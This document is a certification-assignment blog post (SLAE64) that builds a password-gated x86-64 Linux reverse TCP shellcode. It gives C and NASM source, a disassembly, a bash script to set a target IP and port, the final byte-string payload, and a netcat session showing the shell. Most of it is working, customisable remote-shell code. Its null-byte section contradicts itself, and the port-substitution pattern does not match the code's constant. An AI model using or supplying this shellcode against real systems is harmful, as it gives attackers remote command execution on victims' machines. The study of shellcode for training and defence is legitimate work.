
# SLAE Assignment #2

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://www.securitytube-training.com/online-­courses/x8664-assembly-and-shellcoding-on-linux/index.html

Student ID: SLAE64 - 1525

## Assignment

Create a Shell_Reverse_TCP shellcode

* Reverse connects to configured IP and Port
* Needs a "Passcode"
* If Passcode is correct then Execs Shell

Remove 0x00 from the Bind TCP Shellcode discussed 

## C prototype code:

To better understand how the tcp reverse shellcode works, the following C implementation has been created (comments are in the code):

```c
// Filename: ReverseShellTcp.c
// Author:   SLAE64 - 1525
// 
// Purpose: spawn /bin/sh on reverse connect

#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

// Define address and port
#define REMOTE_ADDR "127.0.0.1"
#define REMOTE_PORT 3333

int main(int argc, char *argv[])
{
    // Build required structure
    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    sa.sin_port = htons(REMOTE_PORT);

    // Connects
    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));

    // Duplicate file descriptor
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    // Bind the shell to the connection via file descriptors
    execve("/bin/sh", 0, 0);
    return 0;
}
```

## Assembler Code:

The complete assembler program is the following:

```asm
; Filename: ReverseShellTcp.nasm
; Author:  SLAE64 - 1525
;
; Purpose: spawn /bin/sh on reverse connect
BITS 64

global _start			

section .text

; settings
PASSWORD equ 'abcd'
PORT equ 0x050d ; default 3333
REMOTE_IP equ 0x0101017f

; syscall kernel opcodes
SYS_SOCKET equ 0x29
SYS_CONNECT equ 0x2a
SYS_DUP2 equ 0x21
SYS_EXECVE equ 0x3b
SYS_RECVMMSG equ 0x151
SYS_EXIT equ 0x3C

; syscall constants
AF_INET equ 0x2
SOCK_STREAM equ 0x1
IPPROTO_TCP equ 0x6

_start:

    xor r10, r10 ; general null

create_socket:
    ; Socket
    ;   RAX       RAX    RDI       RSI           RDX
    ; soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    push SYS_SOCKET
    pop rax
    push AF_INET
    pop rdi
    push SOCK_STREAM
    pop rsi
    push IPPROTO_TCP
    pop rdx
    syscall 
    
    mov rdi, rax ; save socket descriptor in rdi

struct_sockaddr:  
    ; server.sin_family = AF_INET 
    ; server.sin_port = htons(PORT)
    ; server.sin_addr.s_addr = inet_addr("127.0.0.1")
    ; bzero(&server.sin_zero, 8)

    mov dword [rsp-4], REMOTE_IP ;INADDR_ANY
    mov word  [rsp-6], PORT ; htons(3333) -> word = 2bytes
    mov byte  [rsp-8], AF_INET ; AF_INET -> word = 2bytes
    sub rsp, 0x8

    mov rsi, rsp ; rsi = &sockaddr

connect:
    ;    rax  rdi           rsi              rdx 
    ; connect(s, (struct sockaddr *)&sa, sizeof(sa));
    
    push SYS_CONNECT
    pop rax
    
    ; rdi already setup
    ; rsi already setup

    push 0x10
    pop rdx
    
    syscall

password_check:

    push rsp
    pop rsi ; rsi = &buf (char*)
    push 0x10 ; rdx = 0x10, >=8 bytes
    pop rdx
                                    
    xor eax, eax ; SYS_READ = 0x0
    syscall

    cmp dword [rsp], PASSWORD ; simple comparison
    jne parent_or_error ; bad pw, abort

dup2:
    ; rax    rdi   rsi 
    ; dup2(soc_cli,0); // standard input
    push SYS_DUP2
    pop rax
    push 0
    pop rsi

    syscall

    ; rax    rdi   rsi 
    ; dup2(soc_cli,1); // standard output
    push SYS_DUP2
    pop rax
    push 1
    pop rsi

    syscall

    ; rax    rdi   rsi 
    ; dup2(soc_cli,2); // standard error
    push SYS_DUP2
    pop rax
    push 2
    pop rsi

    syscall

exec_shell:
    ; rax      rdi     rsi    rdx
    ; execl("/bin/sh","sh",(char *)0);

    xor rsi, rsi ; *argv[] = 0

    push rsi ; '\0'
    mov rdi, 0x68732f2f6e69622f ; hs//bin/
    push rdi ; str        
    mov rdi, rsp  ; rdi = &str (char*)

    push rsi
    mov rdx, rsp ; *envp[] = 0

    push rdi 
    mov rsi, rsp

    push byte SYS_EXECVE
    pop rax
    syscall

parent_or_error:
    ;  rax
    ; exit()
    push SYS_EXIT
    pop rax

    syscall
```

## Check for null bytes

The shellcode has some issues since many null bytes are present, and such null terminator character may break the shellcode execution. The code must be reworked in order to be null free:

In the following code segment are reported the null bytes:

```shell
$ objdump -d ./ReverseShellTcp -M intel

./ReverseShellTcp:     file format elf64-x86-64


Disassembly of section .text:

0000000000400080 <_start>:
  400080:       4d 31 d2                xor    r10,r10

0000000000400083 <create_socket>:
  400083:       6a 29                   push   0x29
  400085:       58                      pop    rax
  400086:       6a 02                   push   0x2
  400088:       5f                      pop    rdi
  400089:       6a 01                   push   0x1
  40008b:       5e                      pop    rsi
  40008c:       6a 06                   push   0x6
  40008e:       5a                      pop    rdx
  40008f:       0f 05                   syscall
  400091:       48 89 c7                mov    rdi,rax

0000000000400094 <struct_sockaddr>:
  400094:       c7 44 24 fc 7f 01 01    mov    DWORD PTR [rsp-0x4],0x101017f
  40009b:       01
  40009c:       66 c7 44 24 fa 0d 05    mov    WORD PTR [rsp-0x6],0x50d
  4000a3:       c6 44 24 f8 02          mov    BYTE PTR [rsp-0x8],0x2
  4000a8:       48 83 ec 08             sub    rsp,0x8
  4000ac:       48 89 e6                mov    rsi,rsp

00000000004000af <connect>:
  4000af:       6a 2a                   push   0x2a
  4000b1:       58                      pop    rax
  4000b2:       6a 10                   push   0x10
  4000b4:       5a                      pop    rdx
  4000b5:       0f 05                   syscall

00000000004000b7 <password_check>:
  4000b7:       54                      push   rsp
  4000b8:       5e                      pop    rsi
  4000b9:       6a 10                   push   0x10
  4000bb:       5a                      pop    rdx
  4000bc:       31 c0                   xor    eax,eax
  4000be:       0f 05                   syscall
  4000c0:       81 3c 24 61 62 63 64    cmp    DWORD PTR [rsp],0x64636261
  4000c7:       75 37                   jne    400100 <parent_or_error>

00000000004000c9 <dup2>:
  4000c9:       6a 21                   push   0x21
  4000cb:       58                      pop    rax
  4000cc:       41 52                   push   r10
  4000ce:       5e                      pop    rsi
  4000cf:       0f 05                   syscall
  4000d1:       6a 21                   push   0x21
  4000d3:       58                      pop    rax
  4000d4:       6a 01                   push   0x1
  4000d6:       5e                      pop    rsi
  4000d7:       0f 05                   syscall
  4000d9:       6a 21                   push   0x21
  4000db:       58                      pop    rax
  4000dc:       6a 02                   push   0x2
  4000de:       5e                      pop    rsi
  4000df:       0f 05                   syscall

00000000004000e1 <exec_shell>:
  4000e1:       48 31 f6                xor    rsi,rsi
  4000e4:       56                      push   rsi
  4000e5:       48 bf 2f 62 69 6e 2f    movabs rdi,0x68732f2f6e69622f
  4000ec:       2f 73 68
  4000ef:       57                      push   rdi
  4000f0:       48 89 e7                mov    rdi,rsp
  4000f3:       56                      push   rsi
  4000f4:       48 89 e2                mov    rdx,rsp
  4000f7:       57                      push   rdi
  4000f8:       48 89 e6                mov    rsi,rsp
  4000fb:       6a 3b                   push   0x3b
  4000fd:       58                      pop    rax
  4000fe:       0f 05                   syscall

0000000000400100 <parent_or_error>:
  400100:       6a 3c                   push   0x3c
  400102:       58                      pop    rax
  400103:       0f 05                   syscall
```

The shellcode is already null free

## Script for shellcode Customization:

The following shell script allows easy shellcode customization, by providing the port and address as 2nd and 3rd arguments respectively:

```shell
#!/bin/bash

echo '######### GCC #########'
echo '[+] Assembling native c implementation with Gcc ... '
gcc ReverseShellTcp.c -o ReverseShellTcp.c_bin
echo '[+] Done!'
echo

echo '######### NASM #########'

echo '[+] Configuring port '$2
port=`printf %04X $2 |grep -o ..|tac|tr -d '\n'`
sed s/5C11/$port/ <$1.nasm >$1.nasm_port

echo '[+] Configuring address '$3
ipaddr=$3
newip=`printf '%02X' ${ipaddr//./ }`
newiprev=`printf ${newip}|grep -o ..|tac|tr -d '\n'`
sed s/0101017f/$newiprev/ <$1.nasm_port >$1.nasm_ip

rm -rf $1.nasm_port

echo '[+] Assembling with Nasm ... '
nasm -f elf64 -o $1.o $1.nasm_ip
echo '[+] Done!'

# rm -rf $1.nasm_ip

echo '[+] Linking ...'
ld -z execstack -o $1 $1.o
echo '[+] Done!'

# echo '[+] Checking for null bytes ...'
# objdump -d $1 -M intel
# echo '[+] Done!'

echo '[+] Objdump ...'
mycode=`objdump -d ./$1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\x/g'|paste -d '' -s |sed 's/^/"/' | sed 's/$/"/g'`

echo '[+] Assemble shellcode.c ...'
 
echo "#include<stdio.h>" >shellcode.c
echo "#include<string.h>" >>shellcode.c
echo "unsigned char code[] = \\" >>shellcode.c
echo $mycode";" >>shellcode.c
echo "main()" >>shellcode.c
echo "{" >>shellcode.c
echo "printf(\"Shellcode Length:  %d\n\", strlen(code));" >>shellcode.c
echo "  int (*ret)() = (int(*)())code;" >>shellcode.c
echo "  ret();" >>shellcode.c
echo "}" >>shellcode.c
 
echo '[+] Compile shellcode.c'
 
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
 
echo '[+] Done!'
```
## Final wrapped shellcode:

The final generated c code is:

```
#include<stdio.h>
#include<string.h>
unsigned char code[] = \
"\x4d\x31\xd2\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x0f\x05\x48\x89\xc7\xc7\x44\x24\xfc\x7f\x01\x01\x01\x66\xc7\x44\x24\xfa\x0d\x05\xc6\x44\x24\xf8\x02\x48\x83\xec\x08\x48\x89\xe6\x6a\x2a\x58\x6a\x10\x5a\x0f\x05\x54\x5e\x6a\x10\x5a\x31\xc0\x0f\x05\x81\x3c\x24\x61\x62\x63\x64\x75\x37\x6a\x21\x58\x41\x52\x5e\x0f\x05\x6a\x21\x58\x6a\x01\x5e\x0f\x05\x6a\x21\x58\x6a\x02\x5e\x0f\x05\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x56\x48\x89\xe2\x57\x48\x89\xe6\x6a\x3b\x58\x0f\x05\x6a\x3c\x58\x0f\x05";
main()
{
printf("Shellcode Length:  %d\n", strlen(code));
  int (*ret)() = (int(*)())code;
  ret();
}
```

## Proof of execution

The execution yelds the following:

Shellcode execution:

```
$ ./shellcode
Shellcode Length:  133
```

and connection:

```
$ nc -lvp 3333
Listening on [0.0.0.0] (family 0, port 3333)
Connection from [127.0.0.1] port 3333 [tcp/*] accepted (family 2, sport 35344)
abcd
id
uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant)
```